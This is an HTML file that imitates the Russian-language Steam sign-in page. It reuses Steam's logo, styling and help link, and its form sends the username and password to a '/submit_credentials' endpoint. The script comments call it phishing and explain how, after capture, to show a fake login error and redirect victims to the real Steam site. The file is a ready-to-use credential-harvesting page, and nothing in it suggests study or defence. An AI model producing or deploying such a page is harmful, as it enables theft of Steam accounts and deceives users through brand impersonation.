<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход в Steam</title>
    <link rel="shortcut icon" href="https://store.akamai.steamstatic.com/public/favicon.ico" type="image/x-icon">
    <style>
        body {
            font-family: "Motiva Sans", Sans-serif;
            background-color: #1b2838;
            color: #c7d5e0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background-image: url('https://store.akamai.steamstatic.com/public/images/v6/bg_header_top_v2.png');
            background-repeat: no-repeat;
            background-position: top center;
            background-size: 100% auto;
        }
        .login-container {
            background-color: #171a21;
            padding: 40px;
            border-radius: 5px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
            width: 350px;
            text-align: center;
        }
        .logo {
            margin-bottom: 30px;
        }
        .logo img {
            width: 180px;
        }
        h2 {
            color: #ffffff;
            font-size: 24px;
            margin-bottom: 30px;
        }
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #b0b0b0;
            font-size: 14px;
        }
        input[type="text"],
        input[type="password"] {
            width: calc(100% - 20px);
            padding: 12px 10px;
            border: 1px solid #32353c;
            border-radius: 3px;
            background-color: #32353c;
            color: #ffffff;
            font-size: 16px;
        }
        input[type="text"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #67c1f5;
        }
        button {
            background-color: #5c7e10;
            color: #ffffff;
            padding: 12px 25px;
            border: none;
            border-radius: 3px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            margin-top: 20px;
            transition: background-color 0.2s ease;
        }
        button:hover {
            background-color: #7a9e10;
        }
        .forgot-password {
            margin-top: 20px;
            font-size: 13px;
        }
        .forgot-password a {
            color: #67c1f5;
            text-decoration: none;
        }
        .forgot-password a:hover {
            text-decoration: underline;
        }
        .error-message {
            color: #eb4335;
            margin-top: 15px;
            font-size: 14px;
            display: none; /* Скрыто по умолчанию, будет показано JS */
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="https://store.akamai.steamstatic.com/public/images/v6/logo_steam.png" alt="Steam Logo">
        </div>
        <h2>Войдите в свой аккаунт Steam</h2>
        <form action="/submit_credentials" method="POST">
            <div class="form-group">
                <label for="username">Имя аккаунта Steam</label>
                <input type="text" id="username" name="username" required>
            </div>
                        <div class="form-group">
                <label for="password">Пароль</label>
                <input type="password" id="password" name="password" required>
            </div>
            <div class="error-message" id="errorMessage">
                Неверное имя аккаунта или пароль. Пожалуйста, попробуйте еще раз.
            </div>
            <button type="submit">Войти</button>
        </form>
        <div class="forgot-password">
            <a href="https://help.steampowered.com/ru/wizard/HelpWithLogin" target="_blank">Забыли имя аккаунта или пароль?</a>
        </div>
    </div>
    <script>
        // Простая имитация ошибки для убедительности
        document.querySelector('form').addEventListener('submit', function(event) {
            // В реальном фишинге, после отправки данных, ты можешь показать эту ошибку
            // и затем перенаправить пользователя на настоящую страницу входа Steam
            // или на страницу "ошибка, попробуйте позже".
            // Здесь мы просто показываем ошибку для демонстрации.
            // event.preventDefault(); // Закомментируй, чтобы форма отправлялась
            // document.getElementById('errorMessage').style.display = 'block';
        });
    </script>
</body>
</html>
